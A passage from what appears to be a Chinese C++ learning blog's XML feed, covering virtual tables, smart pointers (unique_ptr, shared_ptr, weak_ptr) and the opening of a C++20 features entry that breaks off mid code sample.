title="虚表"></a>虚表</h2><p>将父类中函数定义为虚函数后，会出现一个虚表指针（4或8）在上述结构体的第一成员（第二成员是到子类的偏移），指向一个数组。数组中存放的都是函数，如果孩子实现了这个函数，就会放入孩子的。如果孩子的没实现，就会放入自己的。</p><p><img src="/.io//v2-0fceb07713e411d48b4c361452129585_1440w.webp" alt="img"></p><p>类A是基类，类B继承类A，类C又继承类B。类A，类B，类C，假设在子类有实现，其对象模型如下图所示。</p><p><img src="/.io//v2-dfe4aefdee7e06cf3151b57492ed42a2_1440w.webp" alt="img"></p><p>若菱形继承，两个父类均有对虚函数的实现，而子类没有对虚函数的实现，就会出现二义性问题。一般来说，子类都会进行实现，不会出现这种问题。</p><p>经常在父类的析构函数前加virtual，是为了在释放内存时使用子类的析构函数。</p><h2 id="纯虚类"><a href="#纯虚类" class="headerlink" title="纯虚类"></a>纯虚类</h2><p>父类使用纯虚函数<code>virtual void show() = 0;</code>它不会实例化一个对象，在子类继承的时候也会把纯虚函数继承，它强制性要求，派生类必须实现某个接口，不然无法实例化对象</p><p><img src="/.io//20190116230607742.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>智能指针</title>
      <link href="/2023/03/22/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
      <url>/2023/03/22/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<h2 id="智能指针-c-11"><a href="#智能指针-c-11" class="headerlink" title="智能指针 c++11"></a>智能指针 c++11</h2><h3 id="std-unique-ptr-lt-T-gt-：独占资源所有权的指针。"><a href="#std-unique-ptr-lt-T-gt-：独占资源所有权的指针。" class="headerlink" title="std::unique_ptr&lt;T&gt; ：独占资源所有权的指针。"></a><code>std::unique_ptr&lt;T&gt;</code> ：独占资源所有权的指针。</h3><p>当我们独占资源的所有权的时候，可以使用 std::unique_ptr 对资源进行管理——离开 unique_ptr 对象的作用域时，会自动释放资源。</p><p>std::unique_ptr 是 move-only 的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; uptr = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; uptr1 = uptr;  <span class="comment">// 编译错误，std::unique_ptr&lt;T&gt; 是 move-only 的</span></span><br></pre></td></tr></table></figure><p>std::unique_ptr 可以指向一个数组。</p><p>可以自定义 deleter。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">FileCloser</span> &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(FILE* fp)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (fp != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="built_in">fclose</span>(fp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;;  </span><br><span class="line">    <span class="function">std::unique_ptr&lt;FILE, FileCloser&gt; <span class="title">uptr</span><span class="params">(fopen(<span class="string">&quot;test_file.txt&quot;</span>, <span class="string">&quot;w&quot;</span>))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    std::unique_ptr&lt;FILE, std::function&lt;<span class="type">void</span>(FILE*)&gt;&gt; <span class="built_in">uptr</span>(</span><br><span class="line">        <span class="built_in">fopen</span>(<span class="string">&quot;test_file.txt&quot;</span>, <span class="string">&quot;w&quot;</span>), [](FILE* fp) &#123;</span><br><span class="line">            <span class="built_in">fclose</span>(fp);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="std-shared-ptr-lt-T-gt-：共享资源所有权的指针。"><a href="#std-shared-ptr-lt-T-gt-：共享资源所有权的指针。" class="headerlink" title="std::shared_ptr&lt;T&gt; ：共享资源所有权的指针。"></a><code>std::shared_ptr&lt;T&gt;</code> ：共享资源所有权的指针。</h3><p>其实就是对资源做引用计数——当引用计数为 0 的时候，自动释放资源。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; sptr = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">    <span class="built_in">assert</span>(sptr.<span class="built_in">use_count</span>() == <span class="number">1</span>);  <span class="comment">// 此时引用计数为 1</span></span><br><span class="line">    &#123;   </span><br><span class="line">        std::shared_ptr&lt;<span class="type">int</span>&gt; sptr1 = sptr;</span><br><span class="line">        <span class="built_in">assert</span>(sptr.<span class="built_in">get</span>() == sptr1.<span class="built_in">get</span>());</span><br><span class="line">        <span class="built_in">assert</span>(sptr.<span class="built_in">use_count</span>() == <span class="number">2</span>);   <span class="comment">// sptr 和 sptr1 共享资源，引用计数为 2</span></span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="built_in">assert</span>(sptr.<span class="built_in">use_count</span>() == <span class="number">1</span>);   <span class="comment">// sptr1 已经释放</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// use_count 为 0 时自动释放内存</span></span><br></pre></td></tr></table></figure><p>也可以指向数组和自定义 deleter。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// C++20 才支持 std::make_shared&lt;int[]&gt;</span></span><br><span class="line">    <span class="comment">// std::shared_ptr&lt;int[]&gt; sptr = std::make_shared&lt;int[]&gt;(100);</span></span><br><span class="line">    <span class="function">std::shared_ptr&lt;<span class="type">int</span>[]&gt; <span class="title">sptr</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>])</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        sptr[i] = i * i;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        std::cout &lt;&lt; sptr[i] &lt;&lt; std::endl;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::shared_ptr&lt;FILE&gt; <span class="title">sptr</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        fopen(<span class="string">&quot;test_file.txt&quot;</span>, <span class="string">&quot;w&quot;</span>), [](FILE* fp) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">            std::cout &lt;&lt; <span class="string">&quot;close &quot;</span> &lt;&lt; fp &lt;&lt; std::endl;</span></span></span><br><span class="line"><span class="params"><span class="function">            fclose(fp);</span></span></span><br><span class="line"><span class="params"><span class="function">        &#125;)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个 shared_ptr 对象的内存开销要比裸指针和无自定义 deleter 的 unique_ptr 对象略大。</p><p>shared_ptr 需要维护的信息有两部分：</p><ol><li>指向共享资源的指针。</li><li>引用计数等共享资源的控制信息——实现上是维护一个指向控制信息的指针。</li></ol><p>所以，shared_ptr 对象需要保存两个指针。shared_ptr 的 的 deleter 是保存在控制信息中，所以，是否有自定义 deleter 不影响 shared_ptr 对象的大小。</p><p><img src="/.io//v2-e48536157d6181fdb97181769a7c364a_1440w.webp" alt="img"></p><p>不能去掉 shared_ptr 对象中指向共享资源的指针。 因为 shared_ptr 对象中的指针指向的对象不一定和控制块中的指针指向的对象一样。（由于多态的存在，有可能指向父类对象）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="type">int</span> juice;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vegetable</span> &#123;</span><br><span class="line">    <span class="type">int</span> fiber;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Tomato</span> : <span class="keyword">public</span> Fruit, Vegetable &#123;</span><br><span class="line">    <span class="type">int</span> sauce;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 由于继承的存在，shared_ptr 可能指向基类对象</span></span><br><span class="line">std::shared_ptr&lt;Tomato&gt; tomato = std::<span class="built_in">make_shared</span>&lt;Tomato&gt;();</span><br><span class="line">std::shared_ptr&lt;Fruit&gt; fruit = tomato;</span><br><span class="line">std::shared_ptr&lt;Vegetable&gt; vegetable = tomato;</span><br></pre></td></tr></table></figure><p><img src="/.io//v2-8dfc6105c0016d7c22e6212732faf1ef_1440w.webp" alt="img"></p><p>std::shared_ptr 支持 aliasing constructor。</p><p>Aliasing constructor，简单说就是构造出来的 shared_ptr 对象和参数 r 指向同一个控制块（会影响 r 指向的资源的生命周期），但是指向共享资源的指针是参数 ptr。看下面这个例子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Vec = std::vector&lt;<span class="type">int</span>&gt;;</span><br><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">GetSPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> elts = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    std::shared_ptr&lt;Vec&gt; pvec = std::<span class="built_in">make_shared</span>&lt;Vec&gt;(elts);</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">shared_ptr</span>&lt;<span class="type">int</span>&gt;(pvec, &amp;(*pvec)[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sptr = <span class="built_in">GetSPtr</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">-2</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sptr.<span class="built_in">get</span>()[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/.io//v2-ada2e2b5dc8551bf879d77a2b484e071_1440w.webp" alt="img"></p><p>使用 std::shared_ptr 时，会涉及两次内存分配：一次分配共享资源对象；一次分配控制块。C++ 标准库提供了 std::make_shared 函数来创建一个 shared_ptr 对象，只需要一次内存分配。</p><p><img src="/.io//v2-49e619699b5c924097e027cd173df758_1440w.webp" alt="img"></p><p>这种情况下，不用通过控制块中的指针，我们也能知道共享资源的位置——这个指针也可以省略掉。</p><p><img src="/.io//v2-4d50514c2c685097588908f69c3dc027_1440w.webp" alt="img"></p><p>成员函数获取 this 的 shared_ptr 的正确的做法是继承 std::enable_shared_from_this。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span> : <span class="keyword">public</span> std::enable_shared_from_this&lt;Bar&gt; &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function">std::shared_ptr&lt;Bar&gt; <span class="title">GetSPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_from_this</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> sptr1 = std::<span class="built_in">make_shared</span>&lt;Bar&gt;();</span><br><span class="line"><span class="built_in">assert</span>(sptr1.<span class="built_in">use_count</span>() == <span class="number">1</span>);</span><br><span class="line"><span class="keyword">auto</span> sptr2 = sptr1-&gt;<span class="built_in">GetSPtr</span>();</span><br><span class="line"><span class="built_in">assert</span>(sptr1.<span class="built_in">use_count</span>() == <span class="number">2</span>);</span><br><span class="line"><span class="built_in">assert</span>(sptr2.<span class="built_in">use_count</span>() == <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>一般情况下，继承了 std::enable_shared_from_this 的子类，成员变量中增加了一个指向 this 的 weak_ptr。这个 weak_ptr 在第一次创建 shared_ptr 的时候会被初始化，指向 this。</p><p><img src="/.io//v2-fbbbc83da3c87fe48817a4cbda49ce03_1440w.webp" alt="img"></p><p>似乎继承了 std::enable_shared_from_this 的类都被强制必须通过 shared_ptr 进行管理。如果没有创建shared_ptr 直接调用shared_from_this()方法，将会报错。</p><h3 id="std-weak-ptr-lt-T-gt-：共享资源的观察者，需要和-std-shared-ptr-一起使用，不影响资源的生命周期。"><a href="#std-weak-ptr-lt-T-gt-：共享资源的观察者，需要和-std-shared-ptr-一起使用，不影响资源的生命周期。" class="headerlink" title="std::weak_ptr&lt;T&gt; ：共享资源的观察者，需要和 std::shared_ptr 一起使用，不影响资源的生命周期。"></a><code>std::weak_ptr&lt;T&gt;</code> ：共享资源的观察者，需要和 std::shared_ptr 一起使用，不影响资源的生命周期。</h3><p>std::weak_ptr 要与 std::shared_ptr 一起使用。 一个 std::weak_ptr 对象看做是 std::shared_ptr 对象管理的资源的观察者，它不影响共享资源的生命周期：</p><ol><li>如果需要使用 weak_ptr 正在观察的资源，可以将 weak_ptr 提升为 shared_ptr。</li><li>当 shared_ptr 管理的资源被释放时，weak_ptr 会自动变成 nullptr。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Observe</span><span class="params">(std::weak_ptr&lt;<span class="type">int</span>&gt; wptr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> sptr = wptr.<span class="built_in">lock</span>()) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;value: &quot;</span> &lt;&lt; *sptr &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;wptr lock fail&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::weak_ptr&lt;<span class="type">int</span>&gt; wptr;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> sptr = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">111</span>);</span><br><span class="line">    wptr = sptr;</span><br><span class="line">    <span class="built_in">Observe</span>(wptr);  <span class="comment">// sptr 指向的资源没被释放，wptr 可以成功提升为 shared_ptr</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Observe</span>(wptr);  <span class="comment">// sptr 指向的资源已被释放，wptr 无法提升为 shared_ptr</span></span><br></pre></td></tr></table></figure><p>当 shared_ptr 析构并释放共享资源的时候，只要 weak_ptr 对象还存在，控制块就会保留，weak_ptr 可以通过控制块观察到对象是否存活。</p><p><img src="/.io//v2-5f40e9422551bb244753e87ef43d1e64_1440w.webp" alt="img"></p><p><img src="/.io//v2-f387c7135acf9101029fc4981ce2269b_1440w.webp" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c++20</title>
      <link href="/2023/03/22/c-20/"/>
      <url>/2023/03/22/c-20/</url>
      
        <content type="html"><![CDATA[<h2 id="语法糖"><a href="#语法糖" class="headerlink" title="语法糖"></a>语法糖</h2><p>语法糖是指计算机语言中添加的某种语法，这种语法对语言的功能并没有影响，但是更方便程序员使用。</p><p>C++也有很多语法糖，比如运算符重载、lambda表达式、auto类型推导等。这些语法糖可以让我们的代码更简洁、更易读、更高效。例如，下面两种写法是等价的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  sum += i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;) &#123;</span><br><span class="line">  sum += i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c++11、20新特性大多数都是语法糖</p><h2 id="c-20"><a href="#c-20" class="headerlink" title="c++20"></a>c++20</h2><p>C++20有很多新的特性，其中最重要的四个是概念、范围、协程和模块。概念可以让我们定义泛型函数或类的约束条件，范围可以让我们更方便地操作容器和迭代器，协程可以让我们编写异步代码，模块可以让我们更高效地组织代码。除此之外，C++20还有一些其他的新特性，比如三向比较运算符、指定初始化、日历和时区功能等。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>概念是一种用来约束模板类型的语法糖。我们可以用concept关键字来定义一个概念，然后用requires关键字来指定一个模板参数必须满足某个概念。例如，我们可以定义一个Integral概念，表示一个类型必须是整数类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">concept</span> Integral = std::is_integral_v&lt;T&gt;;</span><br><span class="line"><span class="comment">// 然后我们可以用这个概念来约束一个函数模板的参数类型</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;Integral T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，如果我们传入非整数类型的参数，就会在编译时报错。</p><p>概念可以自定义，使用requires关键字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">concept</span> Sortable = <span class="built_in">requires</span>(T a) &#123;</span><br><span class="line">  &#123; std::<span class="built_in">sort</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>()) &#125; -&gt; std::same_as&lt;<span class="type">void</span>&gt;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 这个概念要求T类型有begin()和end()方法，并且可以用std::sort函数进行排序</span></span><br></pre></td></tr></table></figure><p>标准库中提供了上百种常用的概念，放在和等头文件中。比较常用的一些有：std::same_as, std::derived_from, std::convertible_to, std::floating_point等</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;concepts&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;std::integral T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>范围是C++20加入的一个重要的库功能，它提供了描述范围和对范围的操作的统一接口。一个范围是可以循环访问的任何东西，比如一个容器或者一个数组。我们可以用begin()和end()函数来获取一个范围的起始和终止位置。我们也可以用基于范围的for语句来遍历一个范围中的所有元素。例如，我们可以这样打印一个vector中的所有元素：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x : v) &#123;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义的类型，满足range概念，都可以使用范围的特性。即它可以用begin()和end()函数来获取其起始和终止位置。这两个函数返回的对象必须是迭代器或者哨兵。迭代器是可以用++和*操作符来遍历元素的对象，哨兵是可以用&#x3D;&#x3D;操作符来判断是否到达范围的末尾的对象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ranges&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntRange</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">IntRange</span>(<span class="type">int</span> a, <span class="type">int</span> b) : <span class="built_in">a_</span>(a), <span class="built_in">b_</span>(b) &#123;&#125;</span><br><span class="line">  <span class="comment">// 迭代器</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Iterator</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Iterator</span>(<span class="type">int</span> x) : <span class="built_in">x_</span>(x) &#123;&#125;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">operator</span>*() <span class="type">const</span> &#123; <span class="keyword">return</span> x_; &#125;</span><br><span class="line">    Iterator&amp; <span class="keyword">operator</span>++() &#123; ++x_; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Iterator&amp; other) <span class="type">const</span> &#123; <span class="keyword">return</span> x_ == other.x_; &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> Iterator&amp; other) <span class="type">const</span> &#123; <span class="keyword">return</span> !(*<span class="keyword">this</span> == other); &#125;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> x_;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 哨兵</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Sentinel</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Sentinel</span>(<span class="type">int</span> y) : <span class="built_in">y_</span>(y) &#123;&#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Iterator&amp; iter) <span class="type">const</span> &#123; <span class="keyword">return</span> *iter == y_; &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> Iterator&amp; iter) <span class="type">const</span> &#123; <span class="keyword">return</span> !(*<span class="keyword">this</span> == iter); &#125;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> y_;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// begin()和end()函数</span></span><br><span class="line">  <span class="function">Iterator <span class="title">begin</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Iterator</span>(a_); &#125;</span><br><span class="line">  <span class="function">Sentinel <span class="title">end</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Sentinel</span>(b_); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> a_, b_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">IntRange <span class="title">r</span><span class="params">(<span class="number">1</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x : r) &#123;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>协程是一种可以在执行过程中被挂起和恢复的函数。它可以用来实现异步编程，提高性能和并发度。</p><p>C++20中引入了三个新的关键字，co_await，co_yield和co_return，用来标记一个函数是协程。这些关键字只是语法糖，编译器会将协程的上下文打包成一个对象，并让未执行完的协程先返回给调用者。要实现一个C++20协程，还需要提供两个鸭子类型，promise type和awaiter type，分别用来管理协程的生命周期和等待机制。</p><p>例如，我们可以实现一个简单的生成器协程，它每次产生一个整数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 